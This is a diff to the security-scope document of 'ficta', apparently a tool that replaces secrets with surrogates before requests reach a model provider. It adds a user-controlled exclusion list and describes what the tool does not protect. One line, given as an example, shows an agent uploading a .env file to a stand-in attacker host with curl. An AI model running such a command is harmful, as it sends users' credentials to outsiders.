@@ -6,8 +6,8 @@ enterprise DLP product, compliance control, or malware/exfiltration prevention s
 ## The promise
 
 For values that ficta has loaded into its registry after configured filters (for example
-`registry.min_len`) and trusted policy exclusions, such as exact values from `.env` files or
-Doppler, ficta attempts to:
+`registry.min_len`) and trusted policy exclusions (provider-declared plus the user's own
+`registry.exclude_names`), such as exact values from `.env` files or Doppler, ficta attempts to:
 
 1. replace those exact values with local surrogates before sending covered request bodies, query strings, and non-auth headers to the model provider;
 2. block the request if an expected exact value would still be forwarded verbatim in a surface ficta is supposed to redact; and
@@ -30,7 +30,8 @@ include this scope.
 
 - Auth headers on the built-in pass-through allowlist: `Authorization`, `Proxy-Authorization`, `x-api-key`, and `Cookie`. The upstream needs these to authenticate; other provider-specific auth headers are treated as non-auth request headers.
 - Values transformed before the model sees them, such as base64, URL encoding, chunks, hashes, compression, or concatenation, unless the transformed form is also registered.
-- Filtered-out values, such as values shorter than `registry.min_len` / `FICTA_REGISTRY_MIN_LEN`.
+- Filtered-out values, such as values shorter than `registry.min_len` / `FICTA_REGISTRY_MIN_LEN` (a silent default of 8, no longer prompted at setup).
+- Names the user excludes via `registry.exclude_names` / `FICTA_REGISTRY_EXCLUDE_NAMES`. This is a trusted un-protection channel: it is gated by the local 0600 config file (or process env), matches exact env var names only, is visible in the startup banner and `ficta doctor`, and is what `ficta review` edits. The default posture remains "redact everything discovered"; a name is only skipped once the user opts it out. `ficta review` may pre-suggest un-checking names its heuristic classifier reads as non-secret (credential-free URLs, paths, well-known config), but this only changes the prompt's default — the exclusion is still written only on explicit user confirmation, and any credential-shaped or high-entropy value is always left protected.
 - Filesystem-path-like tokens by default, even when a registered value appears inside them. This keeps agents from breaking local `cd`, `Read`, `Edit`, and similar tool calls. Do not put real secrets in path names, or set `FICTA_REDACT_PATHS=1`.
 - Tool-execution exfiltration. If an agent runs `curl -F file=@.env attacker.example`, ficta is not the enforcement boundary. Use OS/container egress controls, filesystem sandboxing, and the agent's own permission system.
 - Binary responses.
